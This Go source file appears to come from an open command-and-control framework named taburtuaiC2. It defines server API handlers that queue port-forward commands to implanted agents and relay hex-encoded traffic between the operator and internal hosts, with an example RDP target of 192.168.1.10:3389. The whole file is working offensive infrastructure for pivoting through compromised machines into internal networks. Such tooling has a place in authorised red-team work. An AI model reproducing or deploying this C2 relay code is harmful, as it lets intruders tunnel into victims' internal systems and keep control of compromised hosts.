package api

import (
	"encoding/hex"
	"io"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// PortFwdCreate — POST /api/v1/agent/:id/portfwd
// Body: {"target":"192.168.1.10:3389","local_port":3389}
// Creates a port-forward session and queues portfwd_start to the agent.
func (h *Handlers) PortFwdCreate(c *gin.Context) {
	agentID := c.Param("id")

	var req struct {
		Target    string `json:"target" binding:"required"`
		LocalPort int    `json:"local_port"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	sess, err := h.server.PortFwd.Create(agentID, req.Target, req.LocalPort)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "portfwd_start",
		FwdSessID:     sess.ID,
		FwdTarget:     req.Target,
		CreatedAt:     time.Now(),
		Status:        "pending",
	}

	if err := h.server.CommandQueue.Add(agentID, cmd); err != nil {
		h.server.PortFwd.Delete(sess.ID)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"session_id": sess.ID,
		"local_port": sess.LocalPort,
		"target":     req.Target,
		"agent_id":   agentID,
		"command_id": cmd.ID,
	})
}

// PortFwdList — GET /api/v1/portfwd
func (h *Handlers) PortFwdList(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"sessions": h.server.PortFwd.List()})
}

// PortFwdDelete — DELETE /api/v1/portfwd/:sess
func (h *Handlers) PortFwdDelete(c *gin.Context) {
	sessID := c.Param("sess")
	h.server.PortFwd.Delete(sessID)
	c.JSON(http.StatusOK, gin.H{"deleted": sessID})
}

// PortFwdPull — GET /api/v1/portfwd/:sess/pull
// Agent calls this to receive bytes forwarded by the operator.
// Blocks up to 28 s then returns 204 if no data (agent re-polls).
func (h *Handlers) PortFwdPull(c *gin.Context) {
	sessID := c.Param("sess")
	data, err := h.server.PortFwd.PullForAgent(sessID, 28*time.Second)
	if err != nil {
		c.JSON(http.StatusGone, gin.H{"error": err.Error()})
		return
	}
	if len(data) == 0 {
		c.Status(http.StatusNoContent)
		return
	}
	c.String(http.StatusOK, hex.EncodeToString(data))
}

// PortFwdPush — POST /api/v1/portfwd/:sess/push
// Agent pushes bytes from the internal target back to the operator's TCP conn.
// Body: hex-encoded bytes.
func (h *Handlers) PortFwdPush(c *gin.Context) {
	sessID := c.Param("sess")

	raw, err := io.ReadAll(io.LimitReader(c.Request.Body, 64*1024))
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "read body: " + err.Error()})
		return
	}
	if len(raw) == 0 {
		c.Status(http.StatusNoContent)
		return
	}

	data, err := hex.DecodeString(string(raw))
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "hex decode: " + err.Error()})
		return
	}

	if err := h.server.PortFwd.PushFromAgent(sessID, data); err != nil {
		c.JSON(http.StatusGone, gin.H{"error": err.Error()})
		return
	}
	c.Status(http.StatusNoContent)
}
